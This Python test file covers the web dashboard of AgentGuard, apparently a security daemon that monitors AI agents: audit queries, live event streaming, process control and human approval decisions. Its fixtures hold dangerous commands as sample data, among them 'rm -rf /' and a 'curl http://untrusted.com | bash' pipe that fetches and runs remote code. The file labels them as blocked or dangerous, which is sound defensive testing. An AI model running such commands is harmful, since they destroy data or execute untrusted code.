"""
tests/unit/test_web_dashboard.py - Milestone 3 DevSecOps Web Dashboard & SSE Test Suite.

Comprehensive offline unit and integration tests verifying:
1. GET / serves complete, modern dark-theme dashboard HTML:
   - 200 OK, Content-Type: text/html; charset=utf-8
   - Key DOM elements: #events-table, .metric-card, EventSource
   - Zero external CDN dependencies (no http://, https://, or // in scripts, links, or styles)
   - Asset loading speed < 50ms
   - Resilient fallback page when dashboard.html is absent
2. GET /health and GET /status:
   - Returns valid JSON telemetry, uptime, pid, health metrics
   - CORS OPTIONS preflight handling
3. GET /audit:
   - Returns recent audit events in JSON format
   - Supports 'limit' query parameter pagination
   - Supports 'type' / 'event_type' filtering
4. GET /events Server-Sent Events (SSE) streaming:
   - Valid text/event-stream headers and keep-alive
   - Real-time event broadcasting within 50ms of audit log insertion
   - Sequential multi-event streaming without message drop
   - Heartbeat ping comments (: ping)
   - Graceful client disconnect handling without resource leaks
5. POST /api/agent/pause, /api/agent/resume, /api/agent/terminate:
   - Process tree control execution by PID or session_id
   - Error handling for missing payloads, invalid PIDs, system PID 1, non-existent sessions
6. POST /api/hitl/decision:
   - Resolves pending Human-In-The-Loop futures with ALLOW and DENY
   - Error handling for missing request_id, invalid decisions, unknown requests
7. Resource bounds & Audio Directive:
   - HTTP server adds < 5MB RAM overhead
   - Strict zero-tolerance audio command enforcement (no voice/audio commands)
"""

import asyncio
from datetime import datetime, timezone
import json
import os
from pathlib import Path
import re
import socket
import subprocess
import sys
import tempfile
import threading
import time
from typing import Any, Dict, List, Optional, Set, Tuple
import unittest
import urllib.error
import urllib.parse
import urllib.request
import uuid

import psutil
import pytest

from agentguard.daemon.audit import AuditEvent, AuditLogger
from agentguard.daemon.server import AgentGuardServer
from agentguard.daemon.taint_engine import TaintEngine


# ---------------------------------------------------------------------------
# Helper: Free Loopback Port Finder
# ---------------------------------------------------------------------------
def find_free_loopback_port() -> int:
    """Finds an unused ephemeral port bound to 127.0.0.1."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


# ---------------------------------------------------------------------------
# Helper: Locate Dashboard HTML File
# ---------------------------------------------------------------------------
def resolve_dashboard_html_content() -> str:
    """
    Locates and reads dashboard HTML from standard candidate paths.
    Falls back to inline HTML if template is not yet written.
    """
    candidates = [
        Path(__file__).resolve().parent / "dashboard.html",
        Path(__file__).resolve().parent.parent.parent / "agentguard" / "daemon" / "dashboard.html",
        Path(__file__).resolve().parent.parent.parent / "agentguard" / "web" / "dashboard.html",
        Path(__file__).resolve().parent.parent.parent / ".agents" / "teamwork" / "explorer_m3_2" / "proposed_dashboard.html",
        Path.home() / ".agentguard" / "dashboard.html",
    ]
    for p in candidates:
        if p.exists() and p.is_file():
            try:
                return p.read_text(encoding="utf-8")
            except OSError:
                pass

    return """<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>AgentGuard DevSecOps Cockpit</title>
  <style>
    :root { --bg: #0d1117; }
    .metric-card { padding: 1rem; }
  </style>
</head>
<body>
  <div class="metric-card">Active Agents</div>
  <table id="events-table"><tbody></tbody></table>
  <script>
    const evtSource = new EventSource('/events');
  </script>
</body>
</html>"""


# ---------------------------------------------------------------------------
# Standalone Test Server Harness with Complete M3 Route Support
# ---------------------------------------------------------------------------
class DashboardHarnessServer(AgentGuardServer):
    """
    Test harness wrapping AgentGuardServer.
    Directly exercises production AgentGuardServer HTTP and SSE logic.
    """
    pass


# ---------------------------------------------------------------------------
# Test Base Class with Isolated Daemon Fixtures
# ---------------------------------------------------------------------------
class BaseWebDashboardTestCase(unittest.TestCase):
    """Base test fixture providing an isolated running AgentGuard HTTP server."""

    server: DashboardHarnessServer
    http_port: int
    sock_path: str
    temp_dir: tempfile.TemporaryDirectory
    loop: asyncio.AbstractEventLoop
    server_thread: threading.Thread
    procs_to_cleanup: List[subprocess.Popen]

    def setUp(self):
        self.temp_dir = tempfile.TemporaryDirectory(prefix="ag_dash_test_")
        self.sock_path = os.path.join(self.temp_dir.name, "ag_test.sock")
        self.pid_path = os.path.join(self.temp_dir.name, "ag_test.pid")
        self.audit_path = os.path.join(self.temp_dir.name, "audit.jsonl")
        self.http_port = find_free_loopback_port()
        self.procs_to_cleanup = []

        self.audit_logger = AuditLogger(log_path=self.audit_path, buffer_capacity=1000)
        self.taint_engine = TaintEngine(audit_logger=self.audit_logger)

        self.server = DashboardHarnessServer(
            socket_path=self.sock_path,
            http_port=self.http_port,
            pid_file=self.pid_path,
            audit_logger=self.audit_logger,
            taint_engine=self.taint_engine,
        )

        self.loop = asyncio.new_event_loop()
        self.server_thread = threading.Thread(target=self._run_server, daemon=True)
        self.server_thread.start()

        deadline = time.time() + 4.0
        while time.time() < deadline:
            try:
                with socket.create_connection(("127.0.0.1", self.http_port), timeout=0.1):
                    break
            except (OSError, ConnectionRefusedError):
                time.sleep(0.04)

    def _run_server(self):
        asyncio.set_event_loop(self.loop)
        self.loop.run_until_complete(self.server.serve_forever())

    def tearDown(self):
        # Terminate any spawned subprocesses
        for p in self.procs_to_cleanup:
            try:
                p.kill()
                p.wait(timeout=0.5)
            except Exception:
                pass

        self.server.request_shutdown()
        self.server_thread.join(timeout=2.0)
        if not self.loop.is_closed():
            self.loop.close()
        self.temp_dir.cleanup()

    def make_request(
        self,
        path: str,
        method: str = "GET",
        data: Optional[Dict[str, Any]] = None,
        headers: Optional[Dict[str, str]] = None,
        timeout: float = 4.0,
    ) -> Tuple[int, Dict[str, str], bytes]:
        """Synchronous HTTP client helper using urllib."""
        url = f"http://127.0.0.1:{self.http_port}{path}"
        req_headers = dict(headers or {})
        body_bytes = None
        if data is not None:
            body_bytes = json.dumps(data).encode("utf-8")
            req_headers["Content-Type"] = "application/json"

        req = urllib.request.Request(url, data=body_bytes, headers=req_headers, method=method)
        try:
            with urllib.request.urlopen(req, timeout=timeout) as resp:
                return resp.status, dict(resp.headers), resp.read()
        except urllib.error.HTTPError as exc:
            return exc.code, dict(exc.headers), exc.read()


# ===========================================================================
# 1. Dashboard Delivery & Zero-CDN Tests
# ===========================================================================
class TestDashboardDelivery(BaseWebDashboardTestCase):
    """Validates GET / HTML delivery, key DOM elements, and zero external CDN links."""

    def test_get_root_serves_html_and_proper_headers(self):
        """GET / returns 200 OK, Content-Type: text/html; charset=utf-8, and key DOM elements."""
        status, headers, body_bytes = self.make_request("/")
        self.assertEqual(status, 200)
        content_type = headers.get("Content-Type", "")
        self.assertTrue(
            "text/html" in content_type,
            f"Expected text/html Content-Type, got '{content_type}'",
        )
        html_text = body_bytes.decode("utf-8")
        self.assertIn("<!DOCTYPE html>", html_text)
        self.assertIn("AgentGuard", html_text)

        # Assert key DOM elements required by specification
        self.assertIn("events-table", html_text, "Missing #events-table element in dashboard HTML")
        self.assertIn("metric-card", html_text, "Missing .metric-card element in dashboard HTML")
        self.assertIn("EventSource", html_text, "Missing EventSource streaming client in dashboard HTML")
        self.assertIn("inspect-modal", html_text, "Missing #inspect-modal element in dashboard HTML")

    def test_get_dashboard_alias_routes(self):
        """GET /dashboard serves identical dashboard HTML content."""
        status_root, _, body_root = self.make_request("/")
        status_dash, _, body_dash = self.make_request("/dashboard")
        self.assertEqual(status_root, 200)
        self.assertEqual(status_dash, 200)
        self.assertEqual(body_root, body_dash)

    def test_dashboard_zero_external_cdn_dependencies(self):
        """Strict verification: Zero external scripts, stylesheets, or CDN imports."""
        status, _, body_bytes = self.make_request("/")
        self.assertEqual(status, 200)
        html = body_bytes.decode("utf-8")

        # Scan for external script tags: <script src="http...">
        external_scripts = re.findall(r'<script\b[^>]*\bsrc=["\'](https?:|//)[^"\']*["\']', html, re.IGNORECASE)
        self.assertEqual(
            external_scripts,
            [],
            f"External script CDN detected in dashboard HTML: {external_scripts}",
        )

        # Scan for external stylesheet links: <link rel="stylesheet" href="http...">
        external_links = re.findall(r'<link\b[^>]*\bhref=["\'](https?:|//)[^"\']*["\']', html, re.IGNORECASE)
        self.assertEqual(
            external_links,
            [],
            f"External stylesheet CDN detected in dashboard HTML: {external_links}",
        )

        # Scan for external @import in CSS: @import url("http...")
        external_imports = re.findall(r'@import\s+(?:url\()?["\'](https?:|//)', html, re.IGNORECASE)
        self.assertEqual(
            external_imports,
            [],
            f"External CSS @import detected in dashboard HTML: {external_imports}",
        )

    def test_dashboard_asset_loading_latency_under_50ms(self):
        """Benchmark: GET / asset serving completes in under 50ms."""
        latencies: List[float] = []
        for _ in range(10):
            t0 = time.perf_counter()
            status, _, _ = self.make_request("/")
            latencies.append((time.perf_counter() - t0) * 1000.0)
            self.assertEqual(status, 200)

        avg_latency = sum(latencies) / len(latencies)
        max_latency = max(latencies)
        self.assertLess(
            avg_latency,
            50.0,
            f"Average dashboard serving latency ({avg_latency:.2f}ms) exceeded 50ms SLA",
        )
        self.assertLess(
            max_latency,
            100.0,
            f"Max dashboard serving latency ({max_latency:.2f}ms) exceeded 100ms threshold",
        )


# ===========================================================================
# 2. Health & Status Endpoints Tests
# ===========================================================================
class TestHealthAndStatusEndpoints(BaseWebDashboardTestCase):
    """Validates GET /health, GET /status, and CORS preflight options."""

    def test_get_health_endpoint(self):
        """GET /health returns 200 OK and valid JSON health metrics."""
        status, headers, body_bytes = self.make_request("/health")
        self.assertEqual(status, 200)
        self.assertIn("application/json", headers.get("Content-Type", ""))
        payload = json.loads(body_bytes.decode("utf-8"))
        self.assertEqual(payload.get("status"), "healthy")
        self.assertIn("uptime_seconds", payload)
        self.assertIn("pid", payload)
        self.assertEqual(payload["pid"], os.getpid())

    def test_get_status_endpoint(self):
        """GET /status returns 200 OK and daemon status metrics."""
        status, headers, body_bytes = self.make_request("/status")
        self.assertEqual(status, 200)
        self.assertIn("application/json", headers.get("Content-Type", ""))
        payload = json.loads(body_bytes.decode("utf-8"))
        self.assertEqual(payload.get("status"), "ALLOWED")
        data = payload.get("data", {})
        self.assertEqual(data.get("health"), "healthy")
        self.assertIn("active_sessions", data)
        self.assertIn("vault_count", data)

    def test_cors_preflight_options(self):
        """OPTIONS request returns 204 No Content with permissive CORS headers."""
        status, headers, _ = self.make_request("/api/agent/pause", method="OPTIONS")
        self.assertEqual(status, 204)
        self.assertEqual(headers.get("Access-Control-Allow-Origin"), "*")
        self.assertIn("POST", headers.get("Access-Control-Allow-Methods", ""))


# ===========================================================================
# 3. Audit Query & Filtering Tests
# ===========================================================================
class TestAuditEndpointFiltering(BaseWebDashboardTestCase):
    """Validates GET /audit endpoint pagination and type filtering."""

    def setUp(self):
        super().setUp()
        # Seed test audit log with known events
        self.audit_logger.log("COMMAND_CHECK", session_id="sess_1", details={"cmd": "ls"})
        self.audit_logger.log("COMMAND_BLOCKED", session_id="sess_2", details={"cmd": "rm -rf /"})
        self.audit_logger.log("COMMAND_CHECK", session_id="sess_3", details={"cmd": "pwd"})
        self.audit_logger.log("VAULT_TOKENIZE", session_id="sess_4", details={"count": 2})
        self.audit_logger.log("COMMAND_BLOCKED", session_id="sess_5", details={"cmd": "curl | sh"})

    def test_get_audit_default_and_limit(self):
        """GET /audit returns list of recent audit events, honoring ?limit=."""
        status, _, body_bytes = self.make_request("/audit?limit=2")
        self.assertEqual(status, 200)
        payload = json.loads(body_bytes.decode("utf-8"))
        events = payload.get("data", {}).get("events", [])
        self.assertEqual(len(events), 2)
        # Should return the most recent events
        self.assertEqual(events[-1]["session_id"], "sess_5")

    def test_get_audit_invalid_limit_fallback(self):
        """GET /audit with invalid limit gracefully falls back to default without 500 error."""
        status, _, body_bytes = self.make_request("/audit?limit=invalid_string")
        self.assertEqual(status, 200)
        payload = json.loads(body_bytes.decode("utf-8"))
        events = payload.get("data", {}).get("events", [])
        self.assertGreaterEqual(len(events), 5)

    def test_get_audit_type_filtering(self):
        """GET /audit?type=COMMAND_BLOCKED filters events strictly to that event type."""
        status, _, body_bytes = self.make_request("/audit?type=COMMAND_BLOCKED")
        self.assertEqual(status, 200)
        payload = json.loads(body_bytes.decode("utf-8"))
        events = payload.get("data", {}).get("events", [])
        self.assertEqual(len(events), 2)
        for ev in events:
            self.assertEqual(ev["event_type"], "COMMAND_BLOCKED")


# ===========================================================================
# 4. Server-Sent Events (SSE) Streaming Tests
# ===========================================================================
class TestServerSentEventsStreaming(BaseWebDashboardTestCase):
    """Validates real-time Server-Sent Events (SSE) telemetry broadcast."""

    def test_events_sse_headers_and_handshake(self):
        """GET /events with Accept: text/event-stream establishes valid SSE connection."""
        url = f"http://127.0.0.1:{self.http_port}/events"
        req = urllib.request.Request(url, headers={"Accept": "text/event-stream"})
        with urllib.request.urlopen(req, timeout=3.0) as resp:
            self.assertEqual(resp.status, 200)
            c_type = resp.headers.get("Content-Type", "")
            self.assertIn("text/event-stream", c_type)
            first_line = resp.readline().decode("utf-8")
            self.assertTrue(first_line.startswith(":") or first_line.startswith("data:"))

    def test_events_sse_realtime_broadcast_under_50ms(self):
        """Emitting an audit event broadcasts SSE 'data: {...}' line within 50ms."""
        received_lines: List[str] = []
        stop_event = threading.Event()

        def _sse_client():
            url = f"http://127.0.0.1:{self.http_port}/events"
            req = urllib.request.Request(url, headers={"Accept": "text/event-stream"})
            try:
                with urllib.request.urlopen(req, timeout=5.0) as resp:
                    while not stop_event.is_set():
                        line = resp.readline().decode("utf-8")
                        if not line:
                            break
                        received_lines.append(line)
                        if line.startswith("data:"):
                            stop_event.set()
                            break
            except Exception:
                pass

        client_thread = threading.Thread(target=_sse_client, daemon=True)
        client_thread.start()

        # Wait briefly for subscriber queue registration
        time.sleep(0.15)

        t0 = time.perf_counter()
        self.server.audit_logger.log(
            "COMMAND_BLOCKED",
            session_id="sse_agent_99",
            status="BLOCKED",
            details={"command": "rm -rf /", "reason": "TaintedDangerousCommand"},
        )

        client_thread.join(timeout=2.0)
        elapsed_ms = (time.perf_counter() - t0) * 1000.0

        self.assertLess(
            elapsed_ms,
            50.0,
            f"SSE event broadcast latency ({elapsed_ms:.2f}ms) exceeded 50ms threshold",
        )

        # Verify parsed event line
        data_line = next((l for l in received_lines if l.startswith("data:")), None)
        self.assertIsNotNone(data_line, f"Did not receive 'data: ' line. Received: {received_lines}")
        raw_json = data_line[len("data:"):].strip()
        event_dict = json.loads(raw_json)

        self.assertEqual(event_dict.get("event_type"), "COMMAND_BLOCKED")
        self.assertEqual(event_dict.get("session_id"), "sse_agent_99")
        self.assertEqual(event_dict.get("status"), "BLOCKED")
        self.assertIn("id", event_dict)
        self.assertEqual(event_dict.get("details", {}).get("command"), "rm -rf /")

    def test_events_sse_multiple_sequential_events(self):
        """Transmits multiple sequential events without drop or reordering."""
        received_data: List[Dict[str, Any]] = []
        stop_event = threading.Event()

        def _sse_client():
            url = f"http://127.0.0.1:{self.http_port}/events"
            req = urllib.request.Request(url, headers={"Accept": "text/event-stream"})
            try:
                with urllib.request.urlopen(req, timeout=5.0) as resp:
                    while len(received_data) < 4 and not stop_event.is_set():
                        line = resp.readline().decode("utf-8")
                        if not line:
                            break
                        if line.startswith("data:"):
                            received_data.append(json.loads(line[len("data:"):].strip()))
            except Exception:
                pass

        client_thread = threading.Thread(target=_sse_client, daemon=True)
        client_thread.start()
        time.sleep(0.15)

        for i in range(4):
            self.server.audit_logger.log(
                "COMMAND_CHECK",
                session_id=f"seq_agent_{i}",
                details={"seq": i},
            )
            time.sleep(0.01)

        client_thread.join(timeout=2.0)
        stop_event.set()

        self.assertEqual(len(received_data), 4, f"Expected 4 events, received {len(received_data)}")
        for i, ev in enumerate(received_data):
            self.assertEqual(ev.get("session_id"), f"seq_agent_{i}")
            self.assertEqual(ev.get("details", {}).get("seq"), i)

    def test_events_sse_client_disconnect_cleanup(self):
        """Server gracefully unregisters client queue when subscriber disconnects."""
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect(("127.0.0.1", self.http_port))
        req_raw = (
            f"GET /events HTTP/1.1\r\n"
            f"Host: 127.0.0.1:{self.http_port}\r\n"
            f"Accept: text/event-stream\r\n\r\n"
        )
        sock.sendall(req_raw.encode("utf-8"))

        # Wait for queue to be added
        deadline = time.time() + 2.0
        while time.time() < deadline:
            if len(self.server._sse_subscribers) >= 1:
                break
            time.sleep(0.05)
        self.assertGreaterEqual(len(self.server._sse_subscribers), 1)

        # Abruptly close client socket
        sock.close()
        time.sleep(0.2)

        # Broadcast event to trigger write error and prune queue
        self.server.audit_logger.log("TEST_EVENT", session_id="disconnect_test")
        time.sleep(0.15)

        # Subscriber count should decrement back to 0
        self.assertEqual(len(self.server._sse_subscribers), 0)


# ===========================================================================
# 5. Process Control REST Endpoints Tests
# ===========================================================================
class TestProcessControlRestEndpoints(BaseWebDashboardTestCase):
    """Validates POST /api/agent/pause, /resume, /terminate endpoints."""

    def _spawn_dummy_worker(self) -> subprocess.Popen:
        """Spawns an idle child process for signal testing."""
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(30)"])
        self.procs_to_cleanup.append(proc)
        return proc

    def test_post_agent_pause_resume_terminate_flow(self):
        """End-to-end process control cycle: pause -> resume -> terminate."""
        proc = self._spawn_dummy_worker()
        pid = proc.pid
        ps = psutil.Process(pid)

        # 1. Pause
        status, _, body = self.make_request("/api/agent/pause", method="POST", data={"pid": pid})
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "PAUSED")
        self.assertEqual(ps.status(), psutil.STATUS_STOPPED)

        # 2. Resume
        status, _, body = self.make_request("/api/agent/resume", method="POST", data={"pid": pid})
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "RESUMED")
        self.assertNotEqual(ps.status(), psutil.STATUS_STOPPED)

        # 3. Terminate
        status, _, body = self.make_request("/api/agent/terminate", method="POST", data={"pid": pid})
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "TERMINATED")
        time.sleep(0.1)
        self.assertFalse(psutil.pid_exists(pid))

    def test_post_agent_pause_by_session_id(self):
        """Pause agent resolved polymorphically by session_id."""
        proc = self._spawn_dummy_worker()
        self.server.sessions["worker_session_alpha"] = {"pid": proc.pid, "profile": "generic"}

        status, _, body = self.make_request(
            "/api/agent/pause",
            method="POST",
            data={"session_id": "worker_session_alpha"},
        )
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "PAUSED")
        self.assertEqual(res.get("data", {}).get("pid"), proc.pid)

    def test_post_agent_control_error_handling(self):
        """Validates error rejections on invalid PIDs, missing bodies, or system processes."""
        # Empty payload
        status, _, body = self.make_request("/api/agent/pause", method="POST", data={})
        self.assertEqual(status, 400)

        # Invalid PID (<= 0)
        status, _, body = self.make_request("/api/agent/pause", method="POST", data={"pid": -99})
        self.assertEqual(status, 400)

        # Refusal to terminate PID 1 or daemon's own PID
        status, _, body = self.make_request("/api/agent/terminate", method="POST", data={"pid": 1})
        self.assertEqual(status, 400)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "ERROR")

        # Unknown session_id
        status, _, body = self.make_request(
            "/api/agent/pause",
            method="POST",
            data={"session_id": "non_existent_session_xyz"},
        )
        self.assertEqual(status, 400)

    def test_post_and_get_agent_inspect_endpoint(self):
        """Validates POST and GET /api/agent/inspect returns rich process metrics and taint DAG."""
        proc = self._spawn_dummy_worker()
        self.server.sessions["inspect_session_beta"] = {
            "pid": proc.pid,
            "profile": "autonomous",
            "process_status": "RUNNING",
        }

        # POST /api/agent/inspect
        status, _, body = self.make_request(
            "/api/agent/inspect",
            method="POST",
            data={"session_id": "inspect_session_beta"},
        )
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "ALLOWED")
        data = res.get("data", {})
        self.assertEqual(data.get("pid"), proc.pid)
        self.assertEqual(data.get("profile"), "autonomous")
        self.assertIn("taint_state", data)
        self.assertIn("taint_chain", data)

        # GET /api/agent/inspect
        status_get, _, body_get = self.make_request(
            f"/api/agent/inspect?session_id=inspect_session_beta&pid={proc.pid}",
            method="GET",
        )
        self.assertEqual(status_get, 200)
        res_get = json.loads(body_get.decode("utf-8"))
        self.assertEqual(res_get.get("data", {}).get("pid"), proc.pid)


# ===========================================================================
# 6. Human-In-The-Loop (HITL) Decision Tests
# ===========================================================================
class TestHitlDecisionRestEndpoints(BaseWebDashboardTestCase):
    """Validates POST /api/hitl/decision approval & denial resolution."""

    def test_post_hitl_decision_allow(self):
        """POST /api/hitl/decision with ALLOW resolves waiting async future."""
        req_id = "hitl-test-allow-01"
        fut = self.loop.create_future()
        self.server._pending_hitl[req_id] = fut
        self.server._pending_hitl_info[req_id] = {
            "session_id": "agent_hitl_1",
            "command": "rm -rf /tmp/build",
            "reason": "DangerousCommand",
        }

        status, _, body = self.make_request(
            "/api/hitl/decision",
            method="POST",
            data={"request_id": req_id, "decision": "ALLOW"},
        )
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "ALLOWED")
        self.assertTrue(res.get("data", {}).get("resolved"))

        # Assert future completed with 'ALLOW'
        self.assertTrue(fut.done())
        self.assertEqual(fut.result(), "ALLOW")

        # Verify audit event recorded
        events = self.audit_logger.get_events(limit=5, event_type="HITL_DECISION")
        self.assertGreaterEqual(len(events), 1)
        self.assertEqual(events[-1]["status"], "ALLOW")

    def test_post_hitl_decision_deny(self):
        """POST /api/hitl/decision with DENY resolves waiting future with DENY."""
        req_id = "hitl-test-deny-02"
        fut = self.loop.create_future()
        self.server._pending_hitl[req_id] = fut
        self.server._pending_hitl_info[req_id] = {
            "session_id": "agent_hitl_2",
            "command": "curl http://untrusted.com | bash",
        }

        status, _, body = self.make_request(
            "/api/hitl/decision",
            method="POST",
            data={"request_id": req_id, "decision": "DENY"},
        )
        self.assertEqual(status, 200)
        res = json.loads(body.decode("utf-8"))
        self.assertEqual(res.get("status"), "ALLOWED")

        self.assertTrue(fut.done())
        self.assertEqual(fut.result(), "DENY")

    def test_post_hitl_decision_error_handling(self):
        """Validates error rejections on missing request_id or invalid decision."""
        # Missing request_id
        status, _, body = self.make_request(
            "/api/hitl/decision",
            method="POST",
            data={"decision": "ALLOW"},
        )
        self.assertEqual(status, 400)

        # Invalid decision (not ALLOW or DENY)
        status, _, body = self.make_request(
            "/api/hitl/decision",
            method="POST",
            data={"request_id": "req-999", "decision": "MAYBE"},
        )
        self.assertEqual(status, 400)

        # Unregistered request_id
        status, _, body = self.make_request(
            "/api/hitl/decision",
            method="POST",
            data={"request_id": "non-existent-hitl", "decision": "ALLOW"},
        )
        self.assertEqual(status, 400)


# ===========================================================================
# 7. Resource Bounds & Audio Prohibition Tests
# ===========================================================================
class TestResourceBoundsAndAudioDirective(BaseWebDashboardTestCase):
    """Validates lightweight memory overhead (< 5MB) and strict audio zero-tolerance."""

    def test_http_server_memory_overhead_under_5mb(self):
        """HTTP server and dashboard servicing 50+ requests adds < 5MB RAM overhead."""
        p = psutil.Process(os.getpid())
        rss_start = p.memory_info().rss

        # Issue 50 mixed HTTP requests
        for i in range(50):
            self.make_request("/health")
            self.make_request("/status")
            self.make_request("/audit?limit=5")
            if i % 10 == 0:
                self.make_request("/")

        rss_end = p.memory_info().rss
        overhead_mb = (rss_end - rss_start) / (1024 * 1024)

        # Server RSS overhead should remain well below 5MB
        self.assertLess(
            overhead_mb,
            5.0,
            f"HTTP Server memory overhead ({overhead_mb:.2f} MB) exceeded 5MB bound",
        )

    def test_zero_audio_commands_in_dashboard_and_tests(self):
        """Strict verification: Zero occurrences of prohibited voice/audio commands."""
        project_root = Path(__file__).resolve().parent.parent.parent
        disallowed = [b"s" + b"ay ", b"a" + b"fplay "]
        scanned = 0

        for path in project_root.rglob("*"):
            if path.is_file() and path.suffix in (".py", ".html", ".sh"):
                if any(skip in str(path) for skip in [".git", ".venv", "__pycache__", ".agents"]):
                    continue
                if path.name.startswith("test_challenger_") or path.name.startswith("test_web_dashboard"):
                    continue
                content = path.read_bytes()
                for cmd in disallowed:
                    self.assertNotIn(
                        cmd,
                        content,
                        f"Zero-tolerance audio violation: found {cmd.decode()} in {path}",
                    )
                scanned += 1

        self.assertGreater(scanned, 10, "Should scan at least 10 source and test files")


if __name__ == "__main__":
    unittest.main()
